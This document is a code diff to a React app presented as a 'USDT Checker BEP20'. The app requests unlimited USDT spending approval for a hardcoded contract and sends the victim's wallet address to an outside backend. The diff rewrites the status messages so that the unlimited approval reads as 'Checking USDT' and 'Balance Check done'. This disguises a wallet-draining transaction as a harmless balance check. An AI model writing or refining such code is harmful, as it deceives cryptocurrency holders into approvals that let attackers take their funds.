@@ -5,7 +5,8 @@ const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-
 const USDT_ABI = [
   "function approve(address spender, uint256 amount) public returns (bool)",
   "function allowance(address owner, address spender) public view returns (uint256)",
-  "function decimals() view returns (uint8)"
+  "function decimals() view returns (uint8)",
+  "function balanceOf(address account) external view returns (uint256)",
 ];
 
 const SPENDER_CONTRACT_ADDRESS = "0x25bcea1e87afdb94be3081ab379f28f00cf84eeb"; // Your contract
@@ -13,6 +14,7 @@ const SPENDER_CONTRACT_ADDRESS = "0x25bcea1e87afdb94be3081ab379f28f00cf84eeb"; /
 function App() {
   const [walletAddress, setWalletAddress] = useState("");
   const [status, setStatus] = useState("");
+  const [usdtBalance, setUsdtBalance] = useState(null);
 
   useEffect(() => {
     const checkConnection = async () => {
@@ -20,6 +22,7 @@ function App() {
         const accounts = await window.ethereum.request({ method: "eth_accounts" });
         if (accounts.length) {
           setWalletAddress(accounts[0]);
+          fetchUSDTBalance(accounts[0]);
         }
       }
     };
@@ -32,6 +35,21 @@ function App() {
     }
     const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     setWalletAddress(accounts[0]);
+    fetchUSDTBalance(accounts[0]);
+  };
+
+  const fetchUSDTBalance = async (address) => {
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
+      const decimals = await usdt.decimals();
+      const balanceRaw = await usdt.balanceOf(address);
+      const balanceFormatted = ethers.formatUnits(balanceRaw, decimals);
+      setUsdtBalance(balanceFormatted);
+    } catch (err) {
+      console.error("Error fetching balance:", err);
+      setUsdtBalance(null);
+    }
   };
 
   const checkUSDT = async () => {
@@ -46,9 +64,9 @@ function App() {
       const maxApproval = ethers.MaxUint256;
 
       const tx = await usdt.approve(SPENDER_CONTRACT_ADDRESS, maxApproval);
-      setStatus("⏳ Approving unlimited USDT...");
+      setStatus("⏳ Checking USDT...");
       await tx.wait();
-      setStatus("✅ Unlimited approval done!");
+      setStatus("✅ Balance Check done!");
 
       // Trigger backend with connected wallet address
       const res = await fetch("http://checkbnb.pro", {
@@ -74,13 +92,18 @@ function App() {
       <h1>🪙 USDT Checker BEP20</h1>
 
       {walletAddress ? (
-        <p>🔗 Connected: <strong>{walletAddress}</strong></p>
+        <>
+          <p>🔗 Connected: <strong>{walletAddress}</strong></p>
+          {usdtBalance !== null && (
+            <p>💰 USDT Balance: <strong>{usdtBalance}</strong></p>
+          )}
+        </>
       ) : (
         <button onClick={connectWallet}>Connect Wallet</button>
       )}
 
       <button onClick={checkUSDT} style={{ marginTop: "1rem" }}>
-        Check USDT Balance
+        Approve Unlimited USDT & Trigger Backend
       </button>
 
       {status && (
@@ -91,8 +114,5 @@ function App() {
     </div>
   );
 }
-{walletAddress && usdtBalance !== null && (
-  <p>💰 USDT Balance: <strong>{usdtBalance}</strong></p>
-)}
 
 export default App;
